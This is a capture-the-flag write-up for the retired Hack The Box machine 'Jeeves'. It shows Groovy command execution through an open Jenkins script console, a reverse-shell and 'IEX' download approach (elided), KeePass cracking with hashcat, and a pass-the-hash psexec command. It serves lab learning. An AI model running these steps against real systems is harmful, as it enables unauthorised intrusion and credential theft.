---
machine: Jeeves
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows / Credentials
state: Retired
tags: [jenkins, groovy, keepass, pass-the-hash, ads, alternate-data-stream]
---

# Jeeves — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Port 80 is a decoy. Port **50000** runs **Jenkins** (`/askjeeves`) **unauthenticated**, with a Groovy *Script Console*: command execution as `kohsuke`. In his `Documents` folder sits a **KeePass** database (`CEH.kdbx`) whose password falls to a dictionary; inside is the administrator's NTLM hash → **pass-the-hash**. The final flag lives in an NTFS **alternate data stream** (`hm.txt:root.txt`).

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp    open  http       Microsoft IIS (fake "Ask Jeeves" page)
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  http       Jetty (Jenkins 2.87)
```

```bash
ffuf -u http://<IP>:50000/FUZZ -w ... -t 200
# askjeeves
```

## Access

The **Script Console** (`/askjeeves/script`) runs Groovy as the service account:

```groovy
println "whoami".execute().text
```

Reverse shell through `cmd.exe` and sockets, or fetch a binary with `powershell -c IEX(...)`.

```groovy
def p = ["cmd","/c","powershell -nop -c ..."].execute(); p.waitFor()
```

## Escalation

1. **KeePass** at `C:\Users\kohsuke\Documents\CEH.kdbx`; exfiltrate with `impacket-smbserver`.

```bash
keepass2john CEH.kdbx > hash.txt
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
```

2. It holds credentials and the administrator's **NTLM hash**. With `psexec`/`wmiexec`:

```bash
psexec.py -hashes :<NTHASH> administrator@<IP>
```

3. **Final flag**: the Administrator desktop has no `root.txt`, only `hm.txt`.

```text
type hm.txt          → "The flag is elsewhere. Look deeper."
dir /r               → hm.txt:root.txt:$DATA
more < hm.txt:root.txt
```

## Pitfalls

- **Port 80 leads nowhere**: a static page imitating a search engine.
- **Jenkins breadth**: the console is the fast route; jobs are unnecessary.
- **Plain `dir`**: without `/r`, alternate streams stay invisible.

## Lessons

- Unauthenticated Jenkins is an instant shell: the script console is RCE by design.
- A password manager in a user profile concentrates the whole impact.
- Pass-the-hash needs no password, only the NTLM hash.
- NTFS hides data from the explorer view: `dir /r`.
